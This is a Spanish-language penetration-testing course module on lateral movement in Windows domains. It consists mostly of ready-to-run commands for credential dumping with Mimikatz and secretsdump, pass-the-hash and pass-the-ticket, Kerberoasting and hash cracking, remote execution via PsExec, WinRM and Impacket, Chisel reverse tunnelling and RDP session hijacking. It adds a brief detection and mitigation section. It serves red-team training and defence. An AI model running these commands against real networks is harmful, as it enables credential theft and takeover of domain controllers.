# 🔀 Movimiento Lateral

> *"Comprometiste una máquina. Ahora necesitas moverte por la red para llegar al objetivo final (DC, database server, etc.). Este documento cubre las técnicas de movimiento lateral que encontrarás en entornos reales."*

---

## 📋 Tabla de contenido

1. [Enumeción de la red](#1-enumecion-de-la-red)
2. [PsExec](#2-psexec)
3. [WinRM](#3-winrm)
4. [Pass-the-Hash](#4-pass-the-hash)
5. [Pass-the-Ticket](#5-pass-the-ticket)
6. [Overpass-the-Hash](#6-overpass-the-hash)
7. [Kerberoasting](#7-kerberoasting)
8. [Mimikatz](#8-mimikatz)
9. [SSH tunneling](#9-ssh-tunneling)
10. [RDP hijacking](#10-rdp-hijacking)
11. [Herramientas](#11-herramientas)
12. [Defensa y remediación](#12-defensa-y-remediación)
13. [Referencias](#13-referencias)

---

## 1. Enumeción de la red

Antes de moverte, necesitas saber **qué hay** en la red.

### Descubrimiento de hosts

```powershell
# PowerShell - ping sweep
1..254 | ForEach-Object {Test-Connection -ComputerName 192.168.1.$_ -Count 1 -Quiet}

# Con nmap
nmap -sn 192.168.1.0/24

# ARP scan
arp -a
```

### Enumeración de servicios

```powershell
# Puertos abiertos
nmap -sV -p 445,3389,5985,5986,22 192.168.1.0/24

# SMB
nmap --script smb-enum-shares -p 445 192.168.1.0/24

# WinRM
nmap --script http-winrm-info -p 5985,5986 192.168.1.0/24
```

### Enumeración de usuarios

```powershell
# Users del dominio (con credenciales válidas)
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# PowerShell
Get-ADUser -Filter * -Properties Name, SamAccountName
Get-ADGroupMember "Domain Admins"
```

### BloodHound

```bash
# Recolección de datos
bloodhound-python -d corp.local -u user -p password -ns 192.168.1.100 -c All

# OSharp
.\SharpHound.exe -c All --zipfilename bloodhound.zip

# SharpHound
.\SharpHound.exe -c All
```

---

## 2. PsExec

Herramienta de Sysinternals para ejecutar comandos en remoto.

### Uso básico

```powershell
# Ejecutar comando remoto
psexec \\192.168.1.100 -u administrator -p password cmd.exe

# Shell interactivo
psexec \\192.168.1.100 -u administrator -p password -i cmd.exe

# Ejecutar archivo
psexec \\192.168.1.100 -u administrator -p password -d C:\Users\victim\shell.exe
```

### PsExec con hash

```powershell
# Pass-the-Hash con PsExec
psexec \\192.168.1.100 -u administrator -H <NTLM_hash>

# Hash en formato LM:NTLM
psexec \\192.168.1.100 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Impacket PsExec

```bash
# En Linux con Impacket
impacket-psexec corp.local/administrator:password@192.168.1.100

# Con hash
impacket-psexec corp.local/administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 3. WinRM

Windows Remote Management permite ejecutar comandos PowerShell en remoto.

### Verificar WinRM

```powershell
# Verificar si WinRM está activo
Test-WSMan -ComputerName 192.168.1.100

# PowerShell
Test-NetConnection -ComputerName 192.168.1.100 -Port 5985
```

### Conectar con WinRM

```powershell
# Crear sesión
$creds = Get-Credential
$session = New-PSSession -ComputerName 192.168.1.100 -Credential $creds

# Ejecutar comando
Invoke-Command -Session $session -ScriptBlock { whoami }

# Shell interactiva
Enter-PSSession -Session $session

# Ejecutar script
Invoke-Command -Session $session -FilePath C:\script.ps1
```

### Evil-WinRM

```bash
# Shell con Evil-WinRM
evil-winrm -i 192.168.1.100 -u administrator -p password

# Con powershell personalizado
evil-winrm -i 192.168.1.100 -u administrator -p password -s /scripts/

# Con dll
evil-winrm -i 192.168.1.100 -u administrator -p password -d payload.dll
```

### WinRM con hash

```bash
# Evil-WinRM con hash
evil-winrm -i 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 4. Pass-the-Hash

Usar hashes NTLM para autenticar sin conocer la contraseña.

### Obtener hashes

```powershell
# Con Mimikatz
mimikatz# sekurlsa::logonpasswords

# Con PowerShell
Get-ChildItem "HKLM:\SECURITY\Policy\Secrets"

# Dump de SAM
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY

# Extraer hashes con secretsdump.py
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

### Pass-the-Hash con Impacket

```bash
# PsExec
impacket-psexec corp.local/administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# WMIExec
impacket-wmiexec corp.local/administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# SMBExec
impacket-smbexec corp.local/administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0

# AtExec
impacket-atexec corp.local/administrator@192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "cmd.exe /c whoami"
```

### Pass-the-Hash con CrackMapExec

```bash
# Autenticar con hash
crackmapexec smb 192.168.1.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Ejecutar comando
crackmapexec smb 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x "whoami"

# Dump SAM
crackmapexec smb 192.168.1.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --sam
```

---

## 5. Pass-the-Ticket

Usar tickets Kerberos para autenticar.

### Obtener tickets

```powershell
# Con Mimikatz
mimikatz# sekurlsa::tickets /export

# Con Rubeus
Rubeus.exe dump /nowrap

# Con PowerShell
Add-Type -Name Watcher -Namespace Root -MemberDefinition @'
[DllImport("kerberos.dll")]
public static extern int LsaEnumerateLogonSessions(out IntPtr Count);
'@
```

### Usar tickets

```bash
# Con Impacket
export KRB5CCNAME=/tmp/user.ccache
impacket-psexec corp.local/user@dc01.corp.local -k -no-pass

# Con Rubeus
Rubeus.exe ptt /ticket:doIFmjCC...
```

---

## 6. Overpass-the-Hash

Usar hashes NTLM para obtener tickets Kerberos.

### Con Rubeus

```powershell
# Obtener TGT con hash
Rubeus.exe asktgt /user:administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt

# Obtener TGT y guardarlo
Rubeus.exe asktgt /user:administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ticket:user.kirbi
```

### Con Mimikatz

```powershell
# Pass the hash → ticket
mimikatz# sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 7. Kerberoasting

Obtener hashes de tickets de servicio Kerberos.

### Detectar SPNs

```powershell
# Buscar SPNs
setspn -T corp.local -Q */*

# PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Kerberoast

```bash
# Con Impacket
impacket-GetUserSPNs corp.local/user:password -request

# Con Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Con PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt
```

### Crackear tickets

```bash
# Con hashcat
hashcat -m 13100 hashes.txt wordlist.txt

# Con john
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

---

## 8. Mimikatz

Herramienta para extraer credenciales de memoria.

### Extraer credenciales

```powershell
# Cargar Mimikatz
mimikatz#

# Extraer todos los logon passwords
sekurlsa::logonpasswords

# Extraer SAM
lsadump::sam

# Extraer cache
lsadump::cache

# Extraer tickets
sekurlsa::tickets /export
```

### Pass-the-Hash con Mimikatz

```powershell
# Pass the hash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0

# Pass the ticket
kerberos::ptt ticket.kirbi

# Overpass the hash
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:powershell.exe
```

### Producción

```powershell
# Dump de credenciales en producción
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Guardar output
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > mimikatz_output.txt
```

---

## 9. SSH tunneling

Túneles SSH para pivoting en redes.

### Port forwarding

```bash
# Local port forwarding
# Acceder a 10.10.10.5:80 a través de 192.168.1.100
ssh -L 8080:10.10.10.5:80 user@192.168.1.100
# Ahora localhost:8080 → 10.10.10.5:80

# Remote port forwarding
# Exponer tu puerto 4444 al servidor
ssh -R 4444:localhost:4444 user@192.168.1.100
# Ahora 192.168.1.100:4444 → tu localhost:4444

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@192.168.1.100
# Configurar proxychains: socks5 127.0.0.1 1080
```

### SSH pivoting con ProxyChains

```bash
# Configurar proxychains
# /etc/proxychains.conf
# socks5 127.0.0.1 1080

# Usar proxychains
proxychains nmap -sV -p 445,3389 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

### SSH tunneling con Chisel

```bash
# Servidor (en tu máquina)
./chisel server --reverse --port 8080

# Cliente (en el target)
./chisel client 10.10.14.5:8080 R:socks

# Usar con proxychains
proxychains nmap -sV -p 445 10.10.10.5
```

---

## 10. RDP hijacking

Hijacking sesiones RDP activas.

### Listar sesiones

```powershell
# Listar sesiones activas
query user
qwinsta

# Output:
# USERNAME              SESSIONNAME        ID  STATE
# administrator         rdp-tcp#0           1  Active
```

### Hijacking de sesión

```powershell
# Con tscon (requiere SYSTEM)
tscon 1 /dest:rdp-tcp

# O con mimikatz
mimikatz# tscon 1 /dest:rdp-tcp
```

### RDP con hash

```bash
# Con RDPY
rdp-hash.py -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 192.168.1.100

# Con xfreerdp
xfreerdp /v:192.168.1.100 /u:administrator /pth:31d6cfe0d16ae931b73c59d7e0c089c0
```

---

## 11. Herramientas

### CrackMapExec / NetExec

```bash
# Enumeración
crackmapexec smb 192.168.1.0/24
crackmapexec smb 192.168.1.0/24 -u user -p password

# Ejecutar comando
crackmapexec smb 192.168.1.100 -u administrator -H <hash> -x "whoami"

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u administrator -H <hash> --sam
```

### Impacket suite

```bash
# PsExec
impacket-psexec corp.local/user:pass@192.168.1.100

# WMIExec
impacket-wmiexec corp.local/user:pass@192.168.1.100

# SMBExec
impacket-smbexec corp.local/user:pass@192.168.1.100

# AtExec
impacket-atexec corp.local/user:pass@192.168.1.100 "cmd.exe /c whoami"

# SecretsDump
secretsdump.py corp.local/user:pass@192.168.1.100

# GetUserSPNs (Kerberoasting)
impacket-GetUserSPNs corp.local/user:pass -request
```

### PowerView

```powershell
# Importar
Import-Module .\PowerView.ps1

# Enumeración
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-NetShare

# Kerberoasting
Invoke-Kerberoast
```

---

## 12. Defensa y remediación

### Para Blue Team / Administradores

| Vector | Detección | Mitigación |
|---|---|---|
| **PsExec** | Logs de eventos 4624, 4648 | Restringir acceso SMB, usar firewalls |
| **WinRM** | Logs de eventos 4103, 4104 | Deshabilitar WinRM si no se usa |
| **Pass-the-Hash** | Logs de eventos 4624, 4648 | Credential Guard, LAPS |
| **Kerberoasting** | Logs de eventos 4769 | Usar contraseñas largas, gMSA |
| **Mimikatz** | Antivirus, EDR | Credential Guard, Protected Users |
| **SSH tunneling** | Monitoreo de tráfico | Firewalls, IDS/IPS |

### Monitoreo activo

```powershell
# Logs de autenticación
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)]]" | Select-Object -First 10

# Logon types
# Type 2: Interactive
# Type 3: Network
# Type 7: Unlock
# Type 10: RemoteInteractive (RDP)

# Eventos sospechosos
# 4624: Logon exitoso
# 4625: Logon fallido
# 4648: Logon explícito (RunAs)
# 4672: Privilegios asignados
# 4769: Ticket Kerberos solicitado
```

### Credential Guard

```powershell
# Habilitar Credential Guard (requiere UEFI)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
```

### LAPS (Local Administrator Password Solution)

```powershell
# Instalar LAPS
Import-Module AdmPwd.PS
Set-AdmPwdPassword -Identity "Computer01" -Password "ComplexPassword123!"

# Obtener password
Get-AdmPwdPassword -ComputerName "Computer01"
```

---

## 13. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **MITRE ATT&CK — Lateral Movement** | [https://attack.mitre.org/tactics/TA0008/](https://attack.mitre.org/tactics/TA0008/) |
| **HackTricks — Lateral Movement** | [https://book.hacktricks.xyz/windows-hardening/lateral-movement](https://book.hacktricks.xyz/windows-hardening/lateral-movement) |
| **Impacket** | [https://github.com/fortra/impacket](https://github.com/fortra/impacket) |
| **CrackMapExec** | [https://github.com/Penntest-docker/CrackMapExec](https://github.com/Penntest-docker/CrackMapExec) |
| **BloodHound** | [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound) |

### Tácticas MITRE ATT&CK

| ID | Táctica | Técnica |
|---|---|---|
| T1021.002 | Remote Services | SMB/Windows Admin Shares |
| T1021.006 | Remote Services | Windows Remote Management |
| T1550.002 | Use Alternate Auth | Pass the Hash |
| T1550.003 | Use Alternate Auth | Pass the Ticket |
| T1558 | Steal/Forge Kerberos | Kerberoasting |
| T1557 | Adversary-in-the-Middle | LLMNR/NBT-NS Poisoning |

---

## 📝 Entregable de portafolio

```markdown
# Movimiento Lateral — [Nombre del dominio]

## Contexto
- Dominio: corp.local
- Usuario comprometido: victim (miembro de "Help Desk")
- Objetivo: Domain Controller (dc01.corp.local)

## Reconocimiento
- BloodHound: victim → Group Policy → Domain Admins
- SPNs encontrados: sql01.corp.local (mssql)

## Vector elegido
- Kerberoasting → crack hash → Pass-the-Hash → PsExec a DC

## Implementación
1. `impacket-GetUserSPNs corp.local/victim:Password1 -request`
2. `hashcat -m 13100 hashes.txt wordlist.txt`
3. `impacket-psexec corp.local/sql_svc@dc01.corp.local -hashes :hash`

## Resultado
- NT AUTHORITY\SYSTEM en DC01

## Defensa
- Usar gMSA para servicios
- Monitorear eventos 4769 (Kerberos)

## Evidencia
- Output de BloodHound: [enlace]
- Output de hashcat: [enlace]
- Screenshot: [enlace]
```

---

**[⬅ Persistencia Windows](../persistence/02-windows-persistence.md)** · **[⬅ Volver al módulo](../README.md)**
